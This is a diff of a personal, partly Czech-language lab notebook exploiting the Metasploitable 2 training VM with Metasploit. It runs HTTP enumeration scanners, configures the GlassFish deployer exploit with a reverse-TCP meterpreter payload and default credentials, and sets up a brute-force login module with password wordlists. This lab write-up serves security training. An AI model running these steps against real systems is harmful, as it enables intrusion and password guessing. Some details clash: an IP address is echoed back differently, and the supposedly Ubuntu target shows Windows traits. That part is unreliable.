@@ -1,6 +1,5 @@
 # My_Little_Cyber_Projects_11
 
-
 EXPLOITING METASPLOITABLE 2
 Metasploitable 2 is an intentionally vulnerable Ubuntu Linux virtual machine designed for security training and penetration testing practice. In this walkthrough, I will methodically exploit its weaknesses, demonstrating a common penetration testing lifecycle: Reconnaissance, Enumeration and Exploitation. My attacking platform will be Kali Linux.
  
@@ -270,38 +269,268 @@ GlassFish Server 4.0
 
 
 EXERCISE 4:
-1.msfconsole
-2.search http scanner
-3.use auxiliary/scanner/http/http_version
+1.msfconsole:
+msf6 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/http_version
+msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 auxiliary(scanner/http/http_version) > set RPORT 80
+RPORT => 80
+msf6 auxiliary(scanner/http/http_version) > run
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/http_version) > 
+
+Na portu 80 teď pokračuji enumerací webu – cílem je zjistit, co tam běží a jestli existují další stránky nebo zranitelnosti.
+
+V Metasploit Framework:
+
+RHOSTS = cílová IP adresa nebo více IP adres
+RPORT = port na cílovém stroji, proti kterému modul poběží
+
+Takže:
+
 set RHOSTS 192.168.56.102
+
+říká Metasploitu: „útoč / skenuj tento počítač“.
+
+A:
+
 set RPORT 80
-run
-4.
+
+říká: „použij port 80“, tedy webserver.
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > use auxiliary/scanner/http/dir_scanner
+msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 auxiliary(scanner/http/dir_scanner) > set RPORT 80
+RPORT => 80
+msf6 auxiliary(scanner/http/dir_scanner) > run
+[*] Detecting error code
+[*] Using code '404' as not found for 192.168.56.102
+[+] Found http://192.168.56.102:80/aspnet_client/ 403 (192.168.56.102)
+
+To znamená, že webserver našel adresář /aspnet_client/, ale vrací HTTP 403 = existuje, ale nemám do něj přístup.
+
+/aspnet_client/ je typický adresář pro ASP.NET, takže na serveru pravděpodobně běží ASP.NET aplikace na Microsoft IIS.
+
+Další scanner, který hledá známé soubory:
+msf6 auxiliary(scanner/http/dir_scanner) > Interrupt: use the 'exit' command to quit
+msf6 auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/files_dir
+msf6 auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 auxiliary(scanner/http/files_dir) > set RPORT 80
+RPORT => 80
+msf6 auxiliary(scanner/http/files_dir) > run
+[*] Using code '404' as not found for files with extension .null
+[*] Using code '404' as not found for files with extension .backup
+[*] Using code '404' as not found for files with extension .bak
+[*] Using code '404' as not found for files with extension .c
+[*] Using code '404' as not found for files with extension .cfg
+[*] Using code '404' as not found for files with extension .class
+[*] Using code '404' as not found for files with extension .copy
+[*] Using code '404' as not found for files with extension .conf
+[*] Using code '404' as not found for files with extension .exe
+[*] Using code '404' as not found for files with extension .html
+[+] Found http://192.168.56.102:80/index.html 200
+[*] Using code '404' as not found for files with extension .htm
+[*] Using code '404' as not found for files with extension .ini
+[*] Using code '404' as not found for files with extension .log
+[*] Using code '404' as not found for files with extension .old
+[*] Using code '404' as not found for files with extension .orig
+[*] Using code '404' as not found for files with extension .php
+[*] Using code '404' as not found for files with extension .tar
+[*] Using code '404' as not found for files with extension .tar.gz
+[*] Using code '404' as not found for files with extension .tgz
+[*] Using code '404' as not found for files with extension .tmp
+[*] Using code '404' as not found for files with extension .temp
+[*] Using code '404' as not found for files with extension .txt
+[*] Using code '404' as not found for files with extension .zip
+[*] Using code '404' as not found for files with extension ~
+[*] Using code '404' as not found for files with extension 
+[*] Using code '404' as not found for files with extension 
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/files_dir) >
+ 
+Našla jsem /index.html, takže otevřu v prohlížeči:
+
+http://192.168.56.102/index.html
+
+Podívám se:
+
+co je na stránce napsané
+jestli jsou tam nějaké odkazy
+případně dám ve Firefoxu „View page Source“
+
+Pak se přesunu na port 8080 a otevřu:
+
+http://192.168.56.102:8080 (na portu 8080 běží výchozí stránka GlassFish Server 4.0. Nejzajímavější bývá administrační rozhraní.)
+
+V Metasploit Framework se vrátím zpět:
+
+back
+
+Pak spustím scanner pro název stránky na portu 8080:
+
+
+msf6 auxiliary(scanner/http/files_dir) > back
+msf6 > use auxiliary/scanner/http/title
+msf6 auxiliary(scanner/http/title) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 auxiliary(scanner/http/title) > set RPORT 8080
+RPORT => 8080
+msf6 auxiliary(scanner/http/title) > run
+[+] [192.168.56.102:8080] [C:200] [R:] [S:] GlassFish Server - Server Running
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/title) > 
+
+Nakonec vyhledám moduly pro GlassFish Server - {glassfish_deployer je exploit}:
+
+
+msf6 auxiliary(scanner/http/title) > search glassfish
+
+Matching Modules
+================
+
+   #   Name                                                                       Disclosure Date  Rank       Check  Description
+   -   ----                                                                       ---------------  ----       -----  -----------
+   0   exploit/multi/http/struts_code_exec_classloader                            2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
+   1     \_ target: Java                                                          .                .          .      .
+   2     \_ target: Linux                                                         .                .          .      .
+   3     \_ target: Windows                                                       .                .          .      .
+   4     \_ target: Windows / Tomcat 6 & 7 and GlassFish 4 (Remote SMB Resource)  .                .          .      .
+   5   auxiliary/scanner/http/glassfish_login                                     .                normal     No     GlassFish Brute Force Utility
+   6   auxiliary/dos/http/hashcollision_dos                                       2011-12-28       normal     No     Hashtable Collisions
+   7   exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl       2012-10-16       excellent  No     Java Applet AverageRangeStatisticImpl Remote Code Execution
+   8     \_ target: Generic (Java Payload)                                        .                .          .      .
+   9     \_ target: Windows x86 (Native Payload)                                  .                .          .      .
+   10    \_ target: Mac OS X x86 (Native Payload)                                 .                .          .      .
+   11    \_ target: Linux x86 (Native Payload)                                    .                .          .      .
+   12  auxiliary/scanner/http/glassfish_traversal                                 2015-08-08       normal     No     Path Traversal in Oracle GlassFish Server Open Source Edition                                                                                                                    
+   13  exploit/multi/http/glassfish_deployer                                      2011-08-04       excellent  No     Sun/Oracle GlassFish Server Authenticated Code Execution
+   14    \_ target: Automatic                                                     .                .          .      .
+   15    \_ target: Java Universal                                                .                .          .      .
+   16    \_ target: Windows Universal                                             .                .          .      .
+   17    \_ target: Linux Universal                                               .                .          .      .
+
+
+Interact with a module by name or index. For example info 17, use 17 or use exploit/multi/http/glassfish_deployer
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Universal'
+
+msf6 exploit(multi/http/glassfish_deployer) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 exploit(multi/http/glassfish_deployer) > set RPORT 4848
+RPORT => 4848
+msf6 exploit(multi/http/glassfish_deployer) > show options
+
+Module options (exploit/multi/http/glassfish_deployer):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   APP_RPORT  8080             yes       The Application interface port
+   PASSWORD                    yes       The password for the specified username
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.56.102   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      4848             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL for outgoing connections
+   TARGETURI  /                yes       The URI path of the GlassFish Server
+   USERNAME   admin            yes       The username to authenticate as
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (linux/x86/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
 
 
 
->What does  the 3-letter acronym FTP stand for?
+View the full module info with the info, or info -d command.
 
-File Transfer Protocol
+msf6 exploit(multi/http/glassfish_deployer) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.101
+msf6 exploit(multi/http/glassfish_deployer) > set RPORT 4848
+RPORT => 4848
+msf6 exploit(multi/http/glassfish_deployer) > set USERNAME admin
+USERNAME => admin
+msf6 exploit(multi/http/glassfish_deployer) > set PASSWORD adminadmin
+PASSWORD => adminadmin
+msf6 exploit(multi/http/glassfish_deployer) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(multi/http/glassfish_deployer) > run
+[*] Started reverse TCP handler on 192.168.56.101:4444 
+[-] Exploit aborted due to failure: unknown: Connection timed out
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/http/glassfish_deployer) > 
 
-Which port does the FTP service listen on usually?
+msf6 exploit(multi/http/glassfish_deployer) > nmap -Pn -p 4848 192.168.56.102
+[*] exec: nmap -Pn -p 4848 192.168.56.102
 
-21
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 12:40 EDT
+Nmap scan report for 192.168.56.102
+Host is up (0.0012s latency).
 
-$ sudo nmap 10.10.14.212
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-27 08:57 CDT
-Nmap scan report for 10.10.14.212
-Host is up (0.0000040s latency).
-Not shown: 998 closed tcp ports (reset)
-PORT    STATE SERVICE
-22/tcp  open  ssh
-111/tcp open  rpcbind
+PORT     STATE SERVICE
+4848/tcp open  appserv-http
+MAC Address: 08:00:27:B9:D4:C2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
+
+Dobře, takže port 4848 je otevřený. To znamená, že administrační konzole GlassFish Server běží, ale pravděpodobně nefungují přihlašovací údaje admin/adminadmin.
+
+msf6 > use auxiliary/scanner/http/glassfish_login
+msf6 auxiliary(scanner/http/glassfish_login) > 
+
+USER_FILE říká modulu, odkud má brát seznam uživatelských jmen.
+
+PASS_FILE říká, odkud má brát seznam hesel.
+
+znamená: „zkoušej postupně uživatele z tohoto souboru“, například:
+
+root
+admin
+guest
+user
+test
+
+A:
+
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+
+znamená: „ke každému uživateli zkoušej hesla z tohoto souboru“, například:
+
+password
+123456
+admin
+toor
+guest
+
+Modul pak automaticky zkouší kombinace jako:
+
+admin : admin
+admin : password
+root : toor
+guest : guest
+
+dokud něco nenajde.
 
 
-sudo nmap -sV -sC -p- 10.10.14.212
+Můžu se podívat, co v těch souborech je:
 
--p- prohledá všechny porty 1–65535
--sV zjistí, co na nich běží
--sC spustí základní detekční skripty
+cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt
 
+ a
 
+cat /usr/share/wordlists/metasploit/unix_passwords.txt
